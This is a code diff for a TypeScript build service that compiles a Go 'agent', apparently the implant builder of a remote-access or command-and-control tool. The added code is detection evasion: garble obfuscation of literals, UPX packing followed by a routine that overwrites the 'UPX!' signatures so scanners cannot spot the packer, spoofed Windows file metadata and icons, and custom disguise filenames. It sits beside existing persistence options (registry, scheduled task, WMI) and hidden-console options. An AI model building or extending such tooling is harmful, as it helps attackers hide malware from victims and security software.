@@ -66,7 +66,143 @@ type BuildProcessConfig = {
   hideConsole?: boolean;
   noPrinting?: boolean;
   builtByUserId?: number;
+  outputName?: string;
+  garbleLiterals?: boolean;
+  garbleTiny?: boolean;
+  garbleSeed?: string;
+  assemblyTitle?: string;
+  assemblyProduct?: string;
+  assemblyCompany?: string;
+  assemblyVersion?: string;
+  assemblyCopyright?: string;
+  iconBase64?: string;
+  enableUpx?: boolean;
+  upxStripHeaders?: boolean;
 };
+
+async function ensureUpxAvailable(sendToStream: (data: any) => void): Promise<string | null> {
+  try {
+    const check = await $`upx --version`.quiet().nothrow();
+    if (check.exitCode === 0) {
+      const ver = check.stdout.toString().split("\n")[0]?.trim() || "upx";
+      sendToStream({ type: "output", text: `UPX found: ${ver}\n`, level: "info" });
+      return "upx";
+    }
+  } catch {}
+
+  sendToStream({ type: "output", text: "UPX not found, attempting auto-install...\n", level: "info" });
+
+  const isWindows = process.platform === "win32";
+
+  if (!isWindows) {
+    try {
+      const apt = await $`apt-get install -y upx-ucl 2>&1`.nothrow().quiet();
+      if (apt.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const apt2 = await $`apt-get install -y upx 2>&1`.nothrow().quiet();
+      if (apt2.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const yum = await $`yum install -y upx 2>&1`.nothrow().quiet();
+      if (yum.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via yum\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+  }
+
+  if (isWindows) {
+    try {
+      const winget = await $`winget install --id upx.upx -e --accept-source-agreements --accept-package-agreements 2>&1`.nothrow().quiet();
+      if (winget.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via winget\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const choco = await $`choco install upx -y 2>&1`.nothrow().quiet();
+      if (choco.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via chocolatey\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+  }
+
+  const arch = process.arch === "x64" ? "amd64" : process.arch === "arm64" ? "arm64" : "amd64";
+  const plat = isWindows ? "win64" : "amd64_linux";
+  const upxVersion = "4.2.4";
+  const archiveName = `upx-${upxVersion}-${plat}`;
+  const ext = isWindows ? "zip" : "tar.xz";
+  const url = `https://github.com/upx/upx/releases/download/v${upxVersion}/${archiveName}.${ext}`;
+  const tmpDir = path.join(ensureDataDir(), "upx-install");
+  fs.mkdirSync(tmpDir, { recursive: true });
+  const archivePath = path.join(tmpDir, `upx.${ext}`);
+
+  try {
+    sendToStream({ type: "output", text: `Downloading UPX from ${url}...\n`, level: "info" });
+    const dlResult = await $`curl -fsSL -o ${archivePath} ${url}`.nothrow().quiet();
+    if (dlResult.exitCode !== 0) {
+      sendToStream({ type: "output", text: "WARNING: Failed to download UPX. Skipping compression.\n", level: "warn" });
+      return null;
+    }
+
+    if (isWindows) {
+      await $`tar -xf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
+    } else {
+      await $`tar -xJf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
+    }
+
+    const upxBinName = isWindows ? "upx.exe" : "upx";
+    const extractedDir = path.join(tmpDir, archiveName);
+    const upxBin = path.join(extractedDir, upxBinName);
+
+    if (fs.existsSync(upxBin)) {
+      if (!isWindows) {
+        await $`chmod +x ${upxBin}`.nothrow().quiet();
+      }
+      sendToStream({ type: "output", text: `UPX downloaded to ${upxBin}\n`, level: "info" });
+      return upxBin;
+    }
+
+    sendToStream({ type: "output", text: "WARNING: UPX binary not found after extraction. Skipping compression.\n", level: "warn" });
+    return null;
+  } catch (err: any) {
+    sendToStream({ type: "output", text: `WARNING: UPX auto-install failed: ${err.message || err}. Skipping compression.\n`, level: "warn" });
+    return null;
+  }
+}
+
+function stripUpxHeaders(filePath: string): boolean {
+  try {
+    const buf = Buffer.from(fs.readFileSync(filePath));
+    const UPX_MAGIC = Buffer.from("UPX!");
+    let modified = false;
+    let offset = 0;
+    while (offset < buf.length - 3) {
+      const idx = buf.indexOf(UPX_MAGIC, offset);
+      if (idx === -1) break;
+      buf[idx] = 0x00;
+      buf[idx + 1] = 0x00;
+      buf[idx + 2] = 0x00;
+      buf[idx + 3] = 0x00;
+      modified = true;
+      offset = idx + 4;
+    }
+    if (modified) {
+      fs.writeFileSync(filePath, buf);
+    }
+    return modified;
+  } catch {
+    return false;
+  }
+}
 
 const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
 
@@ -102,6 +238,7 @@ export async function startBuildProcess(
     startTime: now,
     expiresAt: now + SEVEN_DAYS_MS,
     files: [],
+    userId: config.builtByUserId,
   };
 
   buildManager.addBuildStream(buildId, build);
@@ -127,6 +264,9 @@ export async function startBuildProcess(
       }
     });
   };
+
+  let winresTempDir: string | null = null;
+  const generatedSysoFiles: string[] = [];
 
   const buildStartedAt = Date.now();
   const keepAliveTimer = setInterval(() => {
@@ -226,12 +366,148 @@ export async function startBuildProcess(
     const buildTag = uuidv4();
     sendToStream({ type: "output", text: `Build tag: ${buildTag}\n`, level: "info" });
 
+    if (config.outputName) {
+      sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
+    }
+
+    let upxBin: string | null = null;
+    if (config.enableUpx) {
+      upxBin = await ensureUpxAvailable(sendToStream);
+      if (!upxBin) {
+        sendToStream({ type: "output", text: "WARNING: UPX could not be installed. Compression will be skipped.\n", level: "warn" });
+      }
+    }
+
+    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64);
+    const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));
+
+    if (hasAssemblyData && hasWindowsTargets) {
+      sendToStream({ type: "status", text: "Generating Windows resource data..." });
+
+      const goEnvResult = await $`go env GOPATH`.quiet();
+      const goPath = goEnvResult.stdout.toString().trim();
+      const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
+      const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
+      let winresBin = "go-winres";
+
+      let hasWinres = false;
+      if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
+        winresBin = path.join(goBinDir, winresExe);
+        hasWinres = true;
+      } else {
+        try {
+          await $`go-winres version`.quiet();
+          hasWinres = true;
+        } catch {
+          try {
+            sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
+            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
+            if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
+              winresBin = path.join(goBinDir, winresExe);
+              hasWinres = true;
+            }
+          } catch (installErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Failed to install go-winres: ${installErr.message || installErr}. Assembly data/icon will be skipped.\n`, level: "warn" });
+          }
+        }
+      }
+
+      if (hasWinres) {
+        const agentDir = path.join(clientDir, "cmd", "agent");
+        const winresLockPath = path.join(agentDir, ".winres.lock");
+
+        if (fs.existsSync(winresLockPath)) {
+          sendToStream({
+            type: "output",
+            text: "WARNING: Another build is currently generating Windows resources for this client. Skipping winres for this build.\n",
+            level: "warn",
+          });
+        } else {
+          // Acquire a simple lock so only one build at a time touches cmd/agent/*.syso
+          fs.writeFileSync(winresLockPath, String(process.pid));
+          try {
+            sendToStream({ type: "output", text: `Using go-winres: ${winresBin}\n`, level: "info" });
+            winresTempDir = path.join(outDir, `.winres-${buildId.substring(0, 8)}`);
+            fs.mkdirSync(winresTempDir, { recursive: true });
+
+            const winresConfig: any = {};
+
+            if (config.iconBase64) {
+              try {
+                const iconBuffer = Buffer.from(config.iconBase64, "base64");
+                const iconPath = path.join(winresTempDir, "icon.ico");
+                fs.writeFileSync(iconPath, iconBuffer);
+                winresConfig["RT_GROUP_ICON"] = { "#1": { "0000": "icon.ico" } };
+                sendToStream({ type: "output", text: `Icon embedded (${iconBuffer.length} bytes)\n`, level: "info" });
+              } catch (iconErr: any) {
+                sendToStream({ type: "output", text: `WARNING: Failed to process icon: ${iconErr.message}. Skipping icon.\n`, level: "warn" });
+              }
+            }
+
+            const versionStr = config.assemblyVersion || "0.0.0.0";
+            const versionInfo: any = {
+              "0409": {
+                "FileDescription": config.assemblyTitle || "",
+                "ProductName": config.assemblyProduct || "",
+                "CompanyName": config.assemblyCompany || "",
+                "FileVersion": versionStr,
+                "ProductVersion": versionStr,
+                "LegalCopyright": config.assemblyCopyright || "",
+                "OriginalFilename": config.outputName ? (config.outputName + ".exe") : "",
+              },
+            };
+
+            winresConfig["RT_VERSION"] = {
+              "#1": {
+                "0000": {
+                  "fixed": {
+                    "file_version": versionStr,
+                    "product_version": versionStr,
+                  },
+                  "info": versionInfo,
+                },
+              },
+            };
+
+            const winresJsonPath = path.join(winresTempDir, "winres.json");
+            fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
+            sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });
+
+            const sysoOutPrefix = path.join(agentDir, "rsrc");
+            try {
+              const winresResult = await $`${winresBin} make --in ${winresJsonPath} --out ${sysoOutPrefix}`.cwd(winresTempDir).nothrow().quiet();
+              if (winresResult.exitCode !== 0) {
+                const stderr = winresResult.stderr.toString().trim();
+                sendToStream({ type: "output", text: `WARNING: go-winres failed (exit ${winresResult.exitCode}): ${stderr}\nBuilding without assembly data.\n`, level: "warn" });
+              } else {
+                for (const f of fs.readdirSync(agentDir)) {
+                  if (f.startsWith("rsrc") && f.endsWith(".syso")) {
+                    generatedSysoFiles.push(path.join(agentDir, f));
+                  }
+                }
+                sendToStream({ type: "output", text: `Windows resources generated (${generatedSysoFiles.length} .syso files)\n`, level: "info" });
+              }
+            } catch (winresErr: any) {
+              sendToStream({ type: "output", text: `WARNING: go-winres failed: ${winresErr.message || winresErr}. Building without assembly data.\n`, level: "warn" });
+            }
+          } finally {
+            try {
+              fs.unlinkSync(winresLockPath);
+            } catch {
+              // ignore errors removing the lock
+            }
+          }
+        }
+      }
+    }
+
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
       const actualArch = goarm ? "arm" : arch;
+      const namePrefix = config.outputName || "agent";
       const outputName = deps.sanitizeOutputName(
-        platform.includes("windows") ? `agent-${platform}.exe` : `agent-${platform}`,
+        platform.includes("windows") ? `${namePrefix}-${platform}.exe` : `${namePrefix}-${platform}`,
       );
 
       sendToStream({ type: "status", text: `Building ${platform}...` });
@@ -343,6 +619,15 @@ export async function startBuildProcess(
 
       if (config.obfuscate) {
         sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
+        if (config.garbleLiterals) {
+          sendToStream({ type: "output", text: "Garble: obfuscate literals (-literals)\n", level: "info" });
+        }
+        if (config.garbleTiny) {
+          sendToStream({ type: "output", text: "Garble: tiny mode (-tiny)\n", level: "info" });
+        }
+        if (config.garbleSeed) {
+          sendToStream({ type: "output", text: `Garble: seed=${config.garbleSeed}\n`, level: "info" });
+        }
       }
 
       if (config.noPrinting) {
@@ -355,21 +640,25 @@ export async function startBuildProcess(
         logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
         logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);
 
-        const buildCmd = config.obfuscate
-          ? (config.noPrinting
-              ? (ldflags
-              ? $`garble build -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`garble build -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
-              : (ldflags
-              ? $`garble build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`garble build -o ${outDir}/${outputName} ./cmd/agent`))
-          : (config.noPrinting
-              ? (ldflags
-              ? $`go build -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`go build -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
-              : (ldflags
-              ? $`go build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`go build -o ${outDir}/${outputName} ./cmd/agent`));
+        const garbleFlags: string[] = [];
+        if (config.obfuscate) {
+          if (config.garbleLiterals) garbleFlags.push("-literals");
+          if (config.garbleTiny) garbleFlags.push("-tiny");
+          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
+        }
+
+        const buildArgs: string[] = [];
+        if (config.noPrinting) buildArgs.push("-tags", "noprint");
+        if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
+        buildArgs.push("-o", `${outDir}/${outputName}`, "./cmd/agent");
+
+        let buildCmd;
+        if (config.obfuscate) {
+          const allArgs = [...garbleFlags, "build", ...buildArgs];
+          buildCmd = $`garble ${allArgs}`;
+        } else {
+          buildCmd = $`go build ${buildArgs}`;
+        }
 
         const proc = buildCmd.env(env).cwd(clientDir).nothrow();
         let result: any;
@@ -395,15 +684,42 @@ export async function startBuildProcess(
         }
 
         const filePath = `${outDir}/${outputName}`;
-        const file = Bun.file(filePath);
-        const size = file.size;
+        let finalSize = Bun.file(filePath).size;
+
+        if (upxBin) {
+          sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
+          const originalSize = finalSize;
+          try {
+            const upxResult = await $`${upxBin} --best ${filePath}`.nothrow().quiet();
+            if (upxResult.exitCode !== 0) {
+              const stderr = upxResult.stderr.toString().trim();
+              sendToStream({ type: "output", text: `WARNING: UPX compression failed (exit ${upxResult.exitCode}): ${stderr}\n`, level: "warn" });
+            } else {
+              finalSize = Bun.file(filePath).size;
+              const ratio = ((1 - finalSize / originalSize) * 100).toFixed(1);
+              sendToStream({ type: "output", text: `UPX compressed: ${originalSize} → ${finalSize} bytes (${ratio}% reduction)\n`, level: "info" });
+
+              if (config.upxStripHeaders) {
+                const stripped = stripUpxHeaders(filePath);
+                if (stripped) {
+                  finalSize = Bun.file(filePath).size;
+                  sendToStream({ type: "output", text: `UPX headers stripped (signature removed)\n`, level: "info" });
+                } else {
+                  sendToStream({ type: "output", text: `WARNING: No UPX signatures found to strip\n`, level: "warn" });
+                }
+              }
+            }
+          } catch (upxErr: any) {
+            sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
+          }
+        }
 
         (build.files as any[]).push({
           name: outputName,
           filename: outputName,
           platform,
           version: agentVersion,
-          size,
+          size: finalSize,
         });
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
@@ -444,5 +760,11 @@ export async function startBuildProcess(
     }, 60 * 60 * 1000);
   } finally {
     clearInterval(keepAliveTimer);
+    for (const sysoFile of generatedSysoFiles) {
+      try { fs.unlinkSync(sysoFile); } catch {}
+    }
+    if (winresTempDir) {
+      try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
+    }
   }
 }
